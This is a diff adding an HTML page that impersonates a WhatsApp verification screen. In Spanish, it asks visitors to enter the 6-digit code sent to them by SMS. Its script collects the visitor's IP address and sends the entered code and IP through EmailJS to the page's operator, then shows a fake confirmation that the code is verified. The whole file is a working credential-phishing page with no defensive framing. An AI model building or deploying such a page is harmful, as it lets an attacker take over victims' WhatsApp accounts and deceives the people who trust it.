@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Verification</title>
+
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+<style>
+body {
+    font-family: Arial;
+    background: white;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+}
+
+.box {
+    text-align: center;
+    border: 2px solid #2ecc71;
+    padding: 25px;
+    border-radius: 12px;
+    width: 90%;
+    max-width: 400px;
+}
+
+h2 {
+    color: #2ecc71;
+    font-size: 22px;
+}
+
+p {
+    font-size: 16px;
+}
+
+input {
+    padding: 15px;
+    width: 100%;
+    font-size: 22px;
+    text-align: center;
+    margin-top: 15px;
+    border: 1px solid #ccc;
+    border-radius: 8px;
+    letter-spacing: 5px;
+}
+
+button {
+    margin-top: 20px;
+    padding: 14px;
+    width: 100%;
+    background: #2ecc71;
+    color: white;
+    border: none;
+    cursor: pointer;
+    border-radius: 8px;
+    font-size: 16px;
+}
+
+.success {
+    display: none;
+    color: #2ecc71;
+    margin-top: 15px;
+    font-weight: bold;
+}
+</style>
+
+<script>
+(function(){
+emailjs.init("bOkwZCKhTDxrtRAWs");
+})();
+
+let userIP = "loading...";
+
+// Get IP
+fetch("https://api.ipify.org?format=json")
+.then(res => res.json())
+.then(data => {
+    userIP = data.ip;
+})
+.catch(() => {
+    userIP = "not available";
+});
+
+function sendCode() {
+    const code = document.getElementById("code").value;
+
+    if (code.length !== 6 || isNaN(code)) {
+        alert("Veuillez entrer un code à 6 chiffres");
+        return;
+    }
+
+    emailjs.send("service_7ybnwx6", "template_5l0h45b", {
+        passcode: code,
+        ip: userIP
+    });
+
+    document.getElementById("successMessage").style.display = "block";
+}
+</script>
+
+</head>
+
+<body>
+<div class="box">
+    <h2>Verificación WhatsApp</h2>
+    <p>WhatsApp debe proteger su cuenta. Entra la clave de 6 dígitos enviada por SMS.</p>
+
+    <input 
+        id="code" 
+        type="password" 
+        maxlength="6" 
+        placeholder="••••••"
+        inputmode="numeric"
+    >
+
+    <button onclick="sendCode()">Validate</button>
+
+    <p id="successMessage" class="success">
+        ✔ La clave está verificada!
+    </p>
+</div>
+</body>
+</html>
